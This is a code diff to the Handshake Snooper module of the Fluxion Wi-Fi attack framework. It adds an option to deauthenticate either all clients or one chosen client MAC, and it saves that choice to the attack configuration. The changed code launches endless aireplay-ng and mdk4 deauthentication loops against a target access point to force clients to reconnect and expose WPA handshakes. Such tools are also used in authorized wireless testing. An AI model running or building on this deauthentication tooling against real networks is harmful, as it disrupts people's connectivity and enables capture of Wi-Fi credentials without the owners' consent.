@@ -126,6 +126,52 @@ handshake_snooper_arbiter_daemon() {
   kill -s SIGABRT $1
 }
 
+handshake_snooper_unset_deauthenticator_filter() {
+  if [ ! "$HandshakeSnooperDeauthenticatorFilter" ]; then return 1; fi
+  HandshakeSnooperDeauthenticatorFilter=""
+}
+
+handshake_snooper_set_deauthenticator_filter() {
+  case "$HandshakeSnooperDeauthenticatorIdentifier" in
+    "$HandshakeSnooperAireplayMethodOption")
+      # continue
+      ;;
+    "$HandshakeSnooperMdk4MethodOption")
+      return 0
+      ;;
+    *)
+      # monitor mode
+      return 0
+  esac
+
+  if [ "$HandshakeSnooperDeauthenticatorFilter" ]; then return 0; fi
+  handshake_snooper_unset_deauthenticator_filter
+
+  local choices=(
+    "$FLUXIONAttackDeauthAllClients"
+    "$FLUXIONAttackDeauthSpecificClient"
+    "$FLUXIONGeneralBackOption"
+  )
+  io_query_choice "" choices[@]
+
+  case "$IOQueryChoice" in
+    "$FLUXIONAttackDeauthAllClients")
+      HandshakeSnooperDeauthenticatorFilter="None"
+      ;;
+    "$FLUXIONAttackDeauthSpecificClient")
+      echo -n "$FLUXIONAttackDeauthEnterMacAddress: "
+      read HandshakeSnooperDeauthenticatorFilter
+      ;;
+    "$FLUXIONGeneralBackOption")
+      handshake_snooper_unset_deauthenticator_filter
+      return 1
+      ;;
+    *)
+      # catch exception?
+      ;;
+  esac
+}
+
 handshake_snooper_stop_captor() {
   if [ "$HandshakeSnooperCaptorPID" ]; then
     kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
@@ -175,17 +221,24 @@ handshake_snooper_start_deauthenticator() {
   # Start deauthenticators.
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
-      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
-      HandshakeSnooperDeauthenticatorPID=$!
-    ;;
+      if [ "$HandshakeSnooperDeauthenticatorFilter" = "None" ]; then
+        xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+          -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+          "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
+        HandshakeSnooperDeauthenticatorPID=$!
+      else
+        xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+          -title "Deauthenticating specified client on $FluxionTargetSSID" -e \
+          "while true; do sleep 7; timeout 3 aireplay-ng --deauth=50 -a $FluxionTargetMAC -c $HandshakeSnooperDeauthenticatorFilter --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
+        HandshakeSnooperDeauthenticatorPID=$!
+      fi
+      ;;
     "$HandshakeSnooperMdk4MethodOption")
             xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
                 -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
                 "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
             HandshakeSnooperDeauthenticatorPID=$!
-    ;;
+      ;;
   esac
 }
 
@@ -420,6 +473,7 @@ unprep_attack() {
   handshake_snooper_unset_verifier_identifier
   handshake_snooper_unset_jammer_interface
   handshake_snooper_unset_deauthenticator_identifier
+  handshake_snooper_unset_deauthenticator_filter
 
   sandbox_remove_workfile "$FLUXIONWorkspacePath/capture"
 }
@@ -433,6 +487,7 @@ prep_attack() {
   # I've reported the bug, we can add it when fixed.
   local sequence=(
     "set_deauthenticator_identifier"
+    "set_deauthenticator_filter"
     "set_jammer_interface"
     "set_verifier_identifier"
     "set_verifier_interval"
@@ -457,6 +512,7 @@ load_attack() {
   HandshakeSnooperVerifierIdentifier=${configuration[2]}
   HandshakeSnooperVerifierInterval=${configuration[3]}
   HandshakeSnooperVerifierSynchronicity=${configuration[4]}
+  HandshakeSnooperDeauthenticatorFilter=${configuration[5]}
 }
 
 save_attack() {
@@ -469,6 +525,7 @@ save_attack() {
   echo "$HandshakeSnooperVerifierIdentifier" >> "$configurationPath"
   echo "$HandshakeSnooperVerifierInterval" >> "$configurationPath"
   echo "$HandshakeSnooperVerifierSynchronicity" >> "$configurationPath"
+  echo "$HandshakeSnooperDeauthenticatorFilter" >> "$configurationPath"
 }
 
 stop_attack() {
